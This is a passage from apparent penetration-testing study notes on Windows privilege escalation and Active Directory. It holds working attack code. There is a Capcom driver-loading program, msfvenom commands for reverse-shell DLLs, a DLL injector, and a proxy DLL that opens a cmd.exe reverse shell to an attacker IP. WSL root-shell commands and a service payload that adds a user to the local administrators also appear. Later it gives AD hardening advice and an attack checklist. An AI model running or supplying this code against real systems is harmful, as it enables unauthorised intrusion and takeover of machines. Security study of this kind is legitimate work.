		&dwBufferSize))
	{
		GetLastError();
		return NULL;
	}

	// Check if SID is valid
	if (!IsValidSid(pUserToken->User.Sid))
	{
		wprintf(L"The owner SID is invalid.\n");
		return NULL;
	}

	LPWSTR sidString;
	ConvertSidToStringSidW(pUserToken->User.Sid, &sidString);
	return sidString;
}

ULONG
LoadDriver(HANDLE hToken)
{
	UNICODE_STRING DriverServiceName;
	ULONG dwErrorCode;
	NTSTATUS status;

	typedef NTSTATUS(_stdcall *NT_LOAD_DRIVER)(IN PUNICODE_STRING DriverServiceName);
	typedef void (WINAPI* RTL_INIT_UNICODE_STRING)(PUNICODE_STRING, PCWSTR);

	NT_LOAD_DRIVER NtLoadDriver = (NT_LOAD_DRIVER)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtLoadDriver");
	RTL_INIT_UNICODE_STRING RtlInitUnicodeString = (RTL_INIT_UNICODE_STRING)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");

	LPWSTR win7regPath = new WCHAR[MAX_PATH];
	ZeroMemory(win7regPath, MAX_PATH);
	LPWSTR userSidStr;
	userSidStr = getUserSid(hToken);
	if (userSidStr == NULL)
	{
		wprintf(L"[+] Error while getting user SID\n");
		CloseHandle(hToken);
		hToken = NULL;
	}

	lstrcat(win7regPath, L"\\Registry\\User\\");
	lstrcat(win7regPath, userSidStr);
	lstrcat(win7regPath, L"\\System\\CurrentControlSet\\CAPCOM");

	RtlInitUnicodeString(&DriverServiceName, win7regPath);

	status = NtLoadDriver(&DriverServiceName);
	printf("NTSTATUS: %08x, WinError: %d\n", status, GetLastError());

	if (!NT_SUCCESS(status))
		return RtlNtStatusToDosError(status);

	return 0;
}

int IsTokenSystem(HANDLE tok)
{
	DWORD Size, UserSize, DomainSize;
	SID *sid;
	SID_NAME_USE SidType;
	TCHAR UserName[64], DomainName[64];
	TOKEN_USER *User;
	Size = 0;
	GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
	if (!Size)
		return 0;

	User = (TOKEN_USER *)malloc(Size);
	assert(User);
	GetTokenInformation(tok, TokenUser, User, Size, &Size);
	assert(Size);
	Size = GetLengthSid(User->User.Sid);
	assert(Size);
	sid = (SID *)malloc(Size);
	assert(sid);

	CopySid(Size, sid, User->User.Sid);
	UserSize = (sizeof UserName / sizeof *UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof *DomainName) - 1;
	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	free(sid);

	printf("whoami:\n%S\\%S\n", DomainName, UserName);
	if (!_wcsicmp(UserName, L"SYSTEM"))
		return 0;
	return 1;
}

VOID RetPrivDwordAttributesToStr(DWORD attributes, LPTSTR szAttrbutes)
{
	UINT len = 0;
	if (attributes & SE_PRIVILEGE_ENABLED)
		len += wsprintf(szAttrbutes, TEXT("Enabled"));
	if (attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT)
		len += wsprintf(szAttrbutes, TEXT("Enabled by default"));
	if (attributes & SE_PRIVILEGE_REMOVED)
		len += wsprintf(szAttrbutes, TEXT("Removed"));
	if (attributes & SE_PRIVILEGE_USED_FOR_ACCESS)
		len += wsprintf(szAttrbutes, TEXT("Used for access"));
	if (szAttrbutes[0] == 0)
		wsprintf(szAttrbutes, TEXT("Disabled"));
	return;
}

int GetTokenPrivilege(HANDLE tok)
{
	PTOKEN_PRIVILEGES ppriv = NULL;
	DWORD dwRet = 0;
	GetTokenInformation(tok, TokenGroups, ppriv, dwRet, &dwRet);
	if (!dwRet)
		return 0;
	ppriv = (PTOKEN_PRIVILEGES)calloc(dwRet, 1);
	GetTokenInformation(tok, TokenPrivileges, ppriv, dwRet, &dwRet);
	printf("\nwhoami /priv\n");
	for (int i = 0; i < ppriv->PrivilegeCount; i++)
	{
		TCHAR lpszPriv[MAX_PATH] = { 0 };
		DWORD dwRet = MAX_PATH;
		BOOL n = LookupPrivilegeName(NULL, &(ppriv->Privileges[i].Luid), lpszPriv, &dwRet);
		printf("%-50ws", lpszPriv);
		TCHAR lpszAttrbutes[1024] = { 0 };
		RetPrivDwordAttributesToStr(ppriv->Privileges[i].Attributes, lpszAttrbutes);
		printf("%ws\n", lpszAttrbutes);
	}
	return 1;
}

BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
{

	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, priv, &luid))
	{
		printf("[!]LookupPrivilegeValue error\n");
		return 0;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		printf("[!]AdjustTokenPrivileges error\n");
		return 0;
	}

	IsTokenSystem(hToken);
	GetTokenPrivilege(hToken);

	return TRUE;
}

int _tmain(int argc, _TCHAR* argv[])
{
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		printf("[!]OpenProcessToken error\n");
		return 0;
	}

	EnablePriv(hToken, SE_LOAD_DRIVER_NAME);
	LoadDriver(hToken);
	return 0;
}

```

#### **`UAC`**

UAC enables a consent prompt for elevated activities. Administrators can use security policies to configure how UAC works specific to their organization at the local level (via secpol.msc), or configured and pushed out via GPOs in an AD environment. ### **`DLL Injection`**

DLL (Dynamic Link Library) injection involves an **attacker to run arbitrary code in the context of the address space of another process,** thus influencing its behavior or accessing its resources. If this process is running with excessive privileges, then it could be abused by an attacker, enabling them to execute malicious code in the form of a DLL file to escalate privileges. 

DLL injection finds legitimate applications in various areas:
* Software developers leverage this technology for hot patching without the need to restart the ongoing process
   * Hot Patching enables the amendment or updating of code seamlessly
   * Azure uses hot patching for updating operational services, facilitating the benefits of the update without any downtime. 

<a id="windowsprivescdllinjloadlib"></a>

#### **`LoadLibrary`**

This method employs the LoadLibrary API to load the DLL into the target process's address space. This API is provided by the Windows OS; it loads a DLL into the current process's memory and returns a handle that can be used to get the addresses of functions within the DLL. 

To abuse the LoadLibrary API, the DLL first needs to be dropped into the disk. A malicious executable needs to be created, with the `CreateRemoteThread` function calling the API. The injector locates the address of LoadLibraryW in its own memory space using GetProcAddress and uses CreateRemoteThread to execute it in the target process, causing the target to load the DLL from disk.


**1. Create a Malicious DLL**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f dll -o evil.dll     #metasploit
msfvenom -p windows/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f dll -o evil.dll        #netcat
```
**2. Set up a Listener**
```bash
use exploit/multi/handler       #metasploit; change payload to reflect generated payload 
nc -lvnp xxxx           #netcat
```
**3. Compile Malicious Code:** This process involves allocating memory within the target process for the DLL path and then initiating a remote thread that begins at LoadLibrary and directs towards the DLL path. Compile this code to an .exe
```c
//name dll_injector.c
#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
    HANDLE processHandle;
	PVOID remoteBuffer;
	wchar_t dllPath[] = TEXT("C:\\Path\\To\\evil.dll");

	printf("Injecting DLL to PID: %i\n", atoi(argv[1]));
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
	PTHREAD_START_ROUTINE threadStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
	CreateRemoteThread(processHandle, NULL, 0, threadStartRoutineAddress, remoteBuffer, 0, NULL);
	CloseHandle(processHandle);

	return 0;
}
```

#### **`Manual Mapping`**

With manual mapping, the DLL file is parsed by the attacker, and copied into a remote process. During this attack, the attacker fixes relocations and imports manually, avoiding the LoadLibrary function and Windows loader, resulting in a stealthier attack. Essentially, the attacker manually copies the DLL into the process's memory and makes it run. This is especially effective for the following reasons:
* Evades detection by AV, EDR, and anti-cheat systems
* Bypasses user-mode hooks
* No entry in the Process Environment Block (PEB)

Manual mapping includes:

**1. Loading the DLL as raw data into the injecting process**

**2. Mapping the DLL sections into the targeted process**

**3. Injecting shellcode into the target process and executing it. This shellcode relocates the DLL, rectifies the imports, executes the Thread Local Storage (TLS) callbacks, and finally calls the DLL main.** 

Refer to **[Blackbone](https://github.com/DarthTon/Blackbone)** documentation.

<a id="windowsprivescreflectivedllinj"></a>

#### **`Reflective DLL Injection`**

This technique uses reflective programming to load a library from memory into a host process. The library itself is responsible for its loading process by implementing a minimal Portable Executable (PE) file loader. This allows it to decide how it will load and interact with the host, minimizing interaction with the host system and process

The **[ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection)** repo can be used to execute these attacks and provides an in-depth explanation of reflective DLL Injection. "The process of remotely injecting a library into a process is two fold:
* The library that is to be injected must be written into the address space of the target process (host process)
* The library must be loaded into that host process in such a way that the library's run time expectations are met, such as resolving its imports or relocating it to a suitable location in memory

Assuming there is code execution in the host process and the library to be injected has been written into an arbitrary location of memory in the host process, Reflective DLL Injection works as follows:

1. Execution is passed, either via CreateRemoteThread() or a tiny bootstrap shellcode, to the library's ReflectiveLoader function which is an exported function found in the library's export table

2. As the library's image will currently exists in an arbitrary location in memory, the ReflectiveLoader will first calculate its own image's current location in memory so as to be able to parse its own headers for use later on

3. The ReflectiveLoader will then parse the host processes kernel32.dll export table in order to calculate the addresses of three functions required by the loader, namely LoadLibraryA, GetProcAddress and VirtualAlloc

4. The ReflectiveLoader will now allocate a continuous region of memory into which it will proceed to load its own image. The location is not important as the loader will correctly relocate the image later on

5. The library's headers and sections are loaded into their new locations in memory

6. The ReflectiveLoader will then process the newly loaded copy of its image's import table, loading any additional library's and resolving their respective imported function addresses

7. The ReflectiveLoader will then process the newly loaded copy of its image's relocation table

8. The ReflectiveLoader will then call its newly loaded image's entry point function, DllMain with DLL_PROCESS_ATTACH. The library has now been successfully loaded into memory

9. Finally the ReflectiveLoader will return execution to the initial bootstrap shellcode which called it, or if it was called via CreateRemoteThread, the thread will terminate"

**2. Usage:** To test use the inject.exe to inject reflective_dll.dll into a host process via a PID
```powershell
inject.exe 1234
```

<a id="windowsprivescdllhijacking"></a>

#### **`DLL Hijacking`**

DLL Hijacking sees an attacker leverages on the Windows DLL loading process. These DLLs can be loaded during runtime, creating a hijacking opportunity if an application doesn't specify the full path to a required DLL. The default DLL search order used by the system **depends on whether Safe DLL Search Mode is activated.** When enabled (default), Safe DLL Search Mode repositions the user's current directory further down in the search order. Om tjos case, it is relatively easy to enable/disable the setting by editing the registry. 
1. Open the Run dialog box: Windows + R

2. Type **Regedit** and press enter; this will open the Registry Editor

3. Navigate to `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager`

4. On the right pane, look for the `SafeDllSearchMode` value. If it does not exist, right-click the blank space of the folder or right-click the Session Manager folder, select New and then DWORD (32-bit) Value. Name this new value as `SafeDllSearchMode`

5. Double-click SafeDllSearchMode. In the Value data field, enter **1 to enable and 0 to disable Safe DLL Search Mode**

6. Click OK, close the Registry Editor and **reboot the system** for the changes to take effect.

<br>

**With this mode enabled,** applications search for necessary DLL files in the following sequence:
1. The directory from which the application is loaded
2. The system directory
3. The 16-bit system directory
4. The Windows directory
5. The current directory
6. The directories that are listed in the PATH environment variable

**With this mode deactivated,** the search order changes to:
1. The directory from which the application is loaded
2. The current directory
3. The system directory
4. The 16-bit system directory
5. The Windows directory
6. The directories that are listed in the PATH environment variable

DLL Hijacking involves a few more steps. First, pinpoint a DLL the target is attempting to locate. Specific tools can simplify this task:
* **Process Explorer (Sysinternals):** This tool offers detailed information on running processes, including their loaded DLLs/ By selecting a process and inspecting its properties, DLLs can be viewed

* **PE Explorer:** This tool can open and examine a PE file (i.e., .exe or .dll). Among other features, it reveals the DLLs from which the file imports functionality

* **[Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon):** Open as administrator. Once the filters are applied, the results will show nonexistent DLLs. It is important to note that **procmon only captures information while it is actively running.**
    * Filter > Result is NAME NOT FOUND then include > Apply
    * Filter > Path ends with .dll then include > Apply

**<u>DLL Hijacking: Proxying</u>**

Similar to the previous example, use procmon to locate an DLL that is called by an executable. To understand what the DLL is doing, copy it to the attack host and reverse it via radare2 (analyze and look at the pseudo C code) or ghidra. When inspecting an executable with procmon, **filter for an Operation of Load Image** to only get the libraries the app is loading.

For this example, assume that `library.dll` is called whenever `main.exe` executes. The following code loads an add function from the library.dll, which is used to add two numbers. Subsequently, it prints the result of the addition:
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <windows.h>

typedef int (*AddFunc)(int, int);

int readIntegerInput()
{
    int value;
    char input[100];
    bool isValid = false;

    while (!isValid)
    {
        fgets(input, sizeof(input), stdin);

        if (sscanf(input, "%d", &value) == 1)
        {
            isValid = true;
        }
        else
        {
            printf("Invalid input. Please enter an integer: ");
        }
    }

    return value;
}

int main()
{
    HMODULE hLibrary = LoadLibrary("library.dll");
    if (hLibrary == NULL)
    {
        printf("Failed to load library.dll\n");
        return 1;
    }

    AddFunc add = (AddFunc)GetProcAddress(hLibrary, "Add");
    if (add == NULL)
    {
        printf("Failed to locate the 'Add' function\n");
        FreeLibrary(hLibrary);
        return 1;
    }
    HMODULE hLibrary = LoadLibrary("x.dll");

    printf("Enter the first number: ");
    int a = readIntegerInput();

    printf("Enter the second number: ");
    int b = readIntegerInput();

    int result = add(a, b);
    printf("The sum of %d and %d is %d\n", a, b, result);

    FreeLibrary(hLibrary);
    system("pause");
    return 0;
}
```
In this case, DLL proxying can be used to execute the hijack. This entails the following:

**1. Create a New Library:** A new library will be created that serves as the proxy for `library.dll`. This library will contain the necessary code to load the Add function from library.dll and perform the required tampering

**2. Load the `Add` Function:** Within the new library, the Add function will be loaded from the original `library.dll`. This will allow the attacker to access the original function. 

**3. Tamper with the Function:** Once the Add function is loaded, the attacker can apply the desired tampering or modifications to its result. In this case, the attacker modifies the result of the addition and gets a reverse shell. Compile the script with mingw based on the architecture. **Rename the previous function (library.dll to library.o.dll) and the new function (tamper.dll) to that of the original function (library.dll).**
```c
//tamper.c
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

#define DLL_EXPORT __declspec(dllexport)
typedef int (*AddFunc)(int, int);

char *attacker_ip = "x.x.x.x"; 
int attacker_port = xxxx;

void reverse_shell() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2, 2), &wsa);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(attacker_ip);
    server.sin_port = htons(attacker_port);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    }

    closesocket(sock);
    WSACleanup();
}

DLL_EXPORT int Add(int a, int b)
{
    reverse_shell();

    
    HMODULE originalLibrary = LoadLibraryA("library.o.dll");
    if (originalLibrary != NULL)
    {
        AddFunc originalAdd = (AddFunc)GetProcAddress(originalLibrary, "Add");
        if (originalAdd != NULL)
        {
            return originalAdd(a, b);
        }
    }

    return -1;
}
```
**4. Return the Modified Function:** After completing the tampering process, return the modified Add function from the new library back to main.exe. This will ensure that when main.exe calls the Add function, it will execte the modified version with the intended changes (i.e., reverse shell on attack host). This will be especially effective if the executable runs as SYSTEM or another highly privileged account.

### **`Windows Subsystem for Linux (WSL)`**

WSL is a relatively new feature (released in 2016). It allows users to run Linux on top of a Windows machine without a VM or dual-booting. WSL 1 translates Linux system calls into Windows system calls, while WSL 2 uses a lightweight VM with a real Linux kernel for better performance and compatibility.

By default, WSL runs as the user specified during installation (i.e., a non-root user); however, users can configure WSL to run as root by changing the default user. This does not require the root password, enabling an attacker to create a bind/reverse shell on any port to escalate privileges. 

First, confirm that bash.exe or wsl.exe exist on the Windows machine:
* **`bash.exe`: (C:\Wubdiws\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe)**
* **`wsl.exe`: (C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_[...]\LocalState\rootfs)**
```powershell
where /R c:\windows bash.exe     #deprecated in new versions of WSL
where /R c:\windows wsl.exe
```
Once at least wsl.exe is confirmed to exist, find the **exact Linux distribution and change the default user to root** on the Windows machine:
```bash
c:\windows\[...]\wsl.exe --list --verbose
c:\windows\[...]\wsl.exe -d <distro_name> --user root            #try this command first
c:\windows\[...]\ubuntu000.exe config --default-user root      # may not work
```
If **wsl.exe exists** on the Windows system, Linux commands proceed the wsl execution. To get an interactive shell, use Python to get a bash shell:
```bash
c:\windows\[...]\wsl.exe whoami
c:\windows\[...]\wsl.exe python -c "import pty;pty.spawn('/bin/bash')"
```
If **bash.exe exists** on the Windows system, executing the file will create a non-interactive shell. Make sure that Linux commands work, however. If they work, it may be possible to get an interactive shell via Python in the same way as wsl.exe :
```bash
python -c "import pty;pty.spawn('/bin/bash')"

```

#### **`regsvc`**

This privilege escalation path is technicially service-based, but it directly deals with the registry. In this attack, the **Registry Service (regsvc)** is used to determine whether the attacker has full control (i.e., permissions) over a registry key; if there is, a malicious executable written in C can be compiled and executed on the target machine to escalate privileges. 

**PowerShell Detection:** Look at the access portion. If it says **`NT\Authority\INTERACTIVE Allow FullControl`,** the target is likely vulnerable. Full Control will enable an attacker to add an executable to a service, start the service, then add a high-privilege user. 
```powershell
powershell -ep bypass

Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl

```
**Create a Malicious Payload on the Attack Host (\*nix-based):**
```c
#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 
 
void ServiceMain(int argc, char** argv); 
void ControlHandler(DWORD request); 

int Run() 
{ 
   system("cmd.exe /k net localgroup administrators user /add");           //change "user" with actual username before compiling
   return 0; 
} 

int main() 
{ 
   SERVICE_TABLE_ENTRY ServiceTable[2];
   ServiceTable[0].lpServiceName = "MyService";
   ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

   ServiceTable[1].lpServiceName = NULL;
   ServiceTable[1].lpServiceProc = NULL;
 
   StartServiceCtrlDispatcher(ServiceTable);  
   return 0;
}

void ServiceMain(int argc, char** argv) 
{ 
   ServiceStatus.dwServiceType        = SERVICE_WIN32; 
   ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
   ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
   ServiceStatus.dwWin32ExitCode      = 0; 
   ServiceStatus.dwServiceSpecificExitCode = 0; 
   ServiceStatus.dwCheckPoint         = 0; 
   ServiceStatus.dwWaitHint           = 0; 
 
   hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
   Run(); 
    
   ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
   SetServiceStatus (hStatus, &ServiceStatus);
 
   while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
   {
	      Sleep(SLEEP_TIME);
   }
   return; 
}

void ControlHandler(DWORD request) 
{ 
   switch(request) 
   { 
      case SERVICE_CONTROL_STOP: 
		      ServiceStatus.dwWin32ExitCode = 0; 
         ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
         SetServiceStatus (hStatus, &ServiceStatus);
         return; 
 
      case SERVICE_CONTROL_SHUTDOWN: 
         ServiceStatus.dwWin32ExitCode = 0; 
         ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
         SetServiceStatus (hStatus, &ServiceStatus);
         return; 
        
      default:
         break;
   } 
   SetServiceStatus (hStatus,  &ServiceStatus);
   return; 
} 

```

## **Active Directory**

Active Directory is a services used to manage Windows domain networks. Information is stored in objects, like computers, users, printers, etc. AD is essentially an identity management service, where authentication is handled by Kerberos and Kerberos tickets. Non-Windows machines can authenticate to AD using RADIUS or LDAP.

<a id="activedirintroduction"></a>

### **`Introduction`**

<a id="introtoactivedir"></a>

#### **`Introduction to Active Directory`**

**<u>Physical Components</u>**

Physical components in Active Directory are tangible or infrastructure-related elements. The following are the main physical components:

* **`AD Domain Services (AD DS)`:** The core services that stores directory data and manages communication between users and domains. 

* **`Domain Controllers (DCs)`:** Servers that host AD DS and handle authentication, authorization, and directory lookups. These servers essentially control everything in AD, and they have the ability to do administrative actions, like set group policies or change passwords. 

* **`Global Catalog Server`:** A domain controller that stores a partial replica of all objects in the forest, enabling faster searches across domains.

* **`Read-Only Domain Controller (RODC)`:** A domain controller that hosts a read-only copy of the AD database, often used in remote or less secure locations.

* **`AD Data Store`:** The physical database that stores all the directory data for AD DS. This is implemented as the NTDS.fit file, which resides on the domain controllers. This file also contains user accounts, group memberships, computer accounts, security policies, password hashes, schema, and configuration data. 

* **`AD Certificate Services (AD CS)`:** Issues and manages digital certificates for secure communication. This is used to verify identities in a domain controller, and enhances security through LDAPS. 

<br>

**<u>Logical Components</u>**

Logical components define the structure and organization of objects within Active Directory. The following are the main logical components:

**`Partitions`:** Used to divide the AD database into sections to improve manageability, replication, and performance. Each partition stores specific types of data and is replicated differently across domain controllers.

**`Schema`:** Defines the types of objects and their attributes. Every type of object that can be stored in a directory is defined in a schema. Schemas enforce rules regarding object creation and configuration. 

**`Objects`:** Individual entities in AD, such as users, groups, computers, printers, and shared folders. More specifically, **Class Objects** are created in the directory, like a user or a computer, and they are then assigned attributes, which is attached information. Objects live within **Organizational Units.** 
   * **User:** Enables network resource access for a user
   * **InetOrgPerson:** Similar to a user account, but used for compatibility with other directory services
   * **Contacts:** Used primarily to assign e-mail addresses to external users, but does not enable network access
   * **Groups:** Used to simplify the administration of access control
   * **Computers:** Enables authentication and auditing of computer access to resources
   * **Printers:** Used to simplify the process of locating and connecting to printers
   * **Shared Folders:** Enables users to search for shared folders based on properties

**`Organization Units (OU)`:** Containers used to group objects for easier management and policy application. They are used to manage a collection of objects in a consistent way, apply policies, delegrate permissions to administer groups of objects, and represent the organization hierarchically and logically.

**`Domains`:** Logical groupings of objects that share a common directory database; they are used to manage and maintain objects. There may be several domains in a tree. 

**`Domain Trees`:** A hierarchy (collection) of domains with a parent-child relationship. Domain trees can have additional child domains and a two way transitive trust between the domains. 

**`Forests`:** A collection of domain trees that share a common schema, global catalog, and configuration path. Forests enable trust between all domains in the forest. 

**`Sites`:** Represent the physical topology of the network, used to optimize replication and authentication traffic. 

**`Trust`:** Relationships between domains that allow users in one domain to access resources in another. All domains in a forest trust all other domains in the forest.
   * **Directional Trust:** The trust direction flows from trusting domain to the trusted domain
   * **Transitive Trust:** The trust relationship is extended beyond a two-domain trust to include other trusted domains. If two parent domains share trust, the child domains will be included 

<br>

**<u>Protocols</u>**

**`Kerberos`:** The primary authentication protocol used in AD for secure and fast authentication

**`Lightweight Directory Access Protocol (LDAP)`:** Used to query and modify the directory service

**`RADIUS`:** Used for network access authentication, often in conjunction with VPNs or wireless networks

<br>

**<u>Services</u>**

**`AD Federation Services (AD FS)`:** Provides SSO capabilities for applications across organizational boundaries

**`AD Rights Management Services (AD RMS)`:** Protects sensitive information through encryption and access control

**`Replication Services`:** Ensures that changes made on one domain controller are propagated to others

<a id="activedirhardeningmethods"></a>

#### **`Hardening Methods`**

**`Documentation and Auditing`**

Proper AD hardening can keep attackers contained and prevent lateral movement, privilege escalation, and access to sensitive data and resources. One of the essential steps in AD hardening is understanding everything present in the environment. An audit of the following should be conducted annually, if not every few months, to ensure that the records are up to date:
* Naming conventions of OUs, computers, users, groups
* DNS, network, and DHCP configurations
* All GPOs and the objects that they are applied to
* Assignment of FSMO roles
* Full and current application inventory
* A list of all enterprise hosts and their location
* Any trust relationships we have with other domains or outside entities
* Users who have elevated permissions

<br>

**`People, Processes, and Technology`**

**People:** Even in the most hardened environment, users remain the weakest link. Enforcing security best practices for standard users and administrators will prevent "easy wins" for pentesters and malicious attackers. Every user should undergo basic cybersecurity training to be aware of threats.
* The organization should have a strong password policy, with a password filter that disallows the use of common words. If possible, an enterprise password manager should be used to assist users with choosing and using complex passwords

* Rotate passwords periodically for all service accounts

* Disallow local administrator access on user workstations unless a specific business need exists

* Disable the default RID-500 local admin account and create a new admin account for administration subject to LAPS password rotation

* Implement split tiers of administration for administrative users. 
   
* Clean up privileged groups. Restrict group membership in highly privileged groups to only those users who require this access to perform their daily system administrator duties. This reinforces the PoLP

* Place accounts in the Protected Users group where appropriate. This group, however, can cause issues with authentication, which can result in account lockouts. An organization should never place all privileged users in this group without staged testing. Regardless, the Protected Users group provides the following domain controller and device protections:
   * Group members can not be delegated with constrained or unconstrained delegation.
   * CredSSP will not cache plaintext credentials in memory even if Allow delegating default credentials is set within Group Policy.
   * Windows Digest will not cache the user's plaintext password, even if Windows Digest is enabled.
   * Members cannot authenticate using NTLM authentication or use DES or RC4 keys.
   * After acquiring a TGT, the user's long-term keys or plaintext credentials are not cached.
   * Members cannot renew a TGT longer than the original 4-hour TTL.

* Disable Kerberos delegation for administrative accounts; the Protected Users group may not do this

The **Protected Users** group can be used to restrict what members of this privileged group can do in a domain. Adding users to Protected Users prevents user credentials from being abused if left in memory on a host. The following command shows more information aboutt the group:
```powershell
Get-ADGroup -Identity "Protected Users" -Properties Name,Description,Members

```
**Processes:** Maintaining and enforcing policies and procedures that can significantly impact an organization's overall security posture is necessary. Without defined policies, it is impossible to hold an organization's employees accountable, and difficult to respond to an incident without defined and practiced procedures. The following items can help define processes, policies, and procedures:
* Proper policies and procedures for AD asset management
   * AD host audit, the use of asset tags, and periodic asset inventories can help ensure hosts are not lost

* Access control policies (user account provisioning/de-provisioning), multi-factor authentication mechanisms

* Processes for provisioning and decommissioning hosts (i.e., baseline security hardening guideline, gold images)

* AD cleanup policies
   * Are accounts for former employees removed or just disabled?
   * What is the process for removing stale records from AD?
   * Processes for decommissioning legacy operating systems/services (i.e., proper uninstallation of Exchange when migrating to 0365).
   * Schedule for User, groups, and hosts audit.


**Technology:** Periodically review AD for legacy misconfigurations and new and emerging threats. As changes are made to AD, ensure that common misconfigurations are not introduced
* Use BloodHound, PingCastle, and Grouper periodically to identify AD misconfigurations, and take steps to prevent enumeration with these tools

* Ensure that administrators are not storing passwords in the AD account description field

* Review SYSVOL for scripts containing passwords and other sensitive data

* Avoid the use of "normal" service accounts, using Group Managed (gMSA) and Managed Service Accounts (MSA) where ever possible to mitigate the risk of Kerberoasting

* Disable Unconstrained Delegation wherever possible

* Prevent direct access to Domain Controllers through the use of hardened jump hosts

* Consider setting the ms-DS-MachineAccountQuota attribute to 0, which disallows users from adding machine accounts and can prevent several attacks such as the noPac attack and Resource-Based Constrained Delegation (RBCD)

* Disable the print spooler service wherever possible to prevent several attacks

* Disable NTLM authentication for Domain Controllers if possible

* Use Extended Protection for Authentication along with enabling Require SSL only to allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services

* Enable SMB signing and LDAP signing

* Perform quarterly penetration tests/AD security assessments, but if budget constraints exist, these should be performed annually at the very least

* Test backups for validity and review/practice disaster recovery plans

* Enable the restriction of anonymous access and prevent null session enumeration by setting the RestrictNullSessAccess registry key to 1 to restrict null session access to unauthenticated users.

<a id="activedirattackingmethodology"></a>

#### **`Attacking Methodology`**

**1. Scan the Target System/Subnet:** This is crucial to identify live hosts, open ports, running services on the target network, and OS version(s)
   * If on the same LAN, use responder, wireshark, then nmap
   * If on a different LAN, use nmap

**2. Enumerate Domain(s):** Once live hosts are identified, shift focus to domain-related information
   * Use nmap, with a script on LDAP
   * ldapserch, dig, nslookup

**3. Enumerate Users:** Gather domain users, groups and privileged accounts
   * Use kerbrute, metasploit, rpcclient, enum4linux
   * Create a word list for potential users based on previous enumeration or OSINT
   * Impacket-NPUsers for later ASREPRoasting

**4. Enumerate Password Policy:** Enables brute-forcing and password spraying
   * Use CME, check SMB NULL sessions & LDAP anonymous binds, enum4linux

**5. Gain a Foothold on the Target Domain:** Leverage identified vulnerabilities/misconfigurations to gain initial access, or try a common tactic
   * If on the same network as the AD environment, try LLMNR attacks, SMB relay, and the mentioned IPv6 attack
   * Password spray with enumerated accounts
   * If there is web app access, try common web app attacks
      * If there is an upload page on the site, try to upload a malicious shell
   * Abuse CVEs like zerologon; this is why the target system/subnet should be scanned

**6. Enumerate the Domain Internally:** Identify high-value targets and paths to privilege escalation
   * Get a complete listing of users and groups, available shares, logged in users, other devices to pivot to
   * Security controls, ACLs, domain trusts, relationships, and privileged accounts, misconfigurations
   * BloodHound, SharpHound LDAPDomainDump, CME
   * Net commands, PowerView, ActiveDirectory module, native Windows commands

**7. Escalate Privileges | Move Laterally to Pwn the Domain:** Obtain administrative privileges and access sensitive systems/data
   * Kerberoasting (Rubeus), ASREPRoasting, token impersonation, GPP & pass attacks, secretsdump (impacket suite)
   * Find more cleartext credentials (Mimikatz: sekurlsa)
   * CVEs like PrintNightmare, noPAC, PetitPotam
   * Abuse enumerated ACL, GPO, and trust misconfigs

**8. Gain Persistence** Extract all domain credentials (NTLM hashes, Kerberos tickets) and maintain long-term access to the domain
   * Dump NTDS.dit 
   * Golden Ticket

### **`Initial Enumeration`**

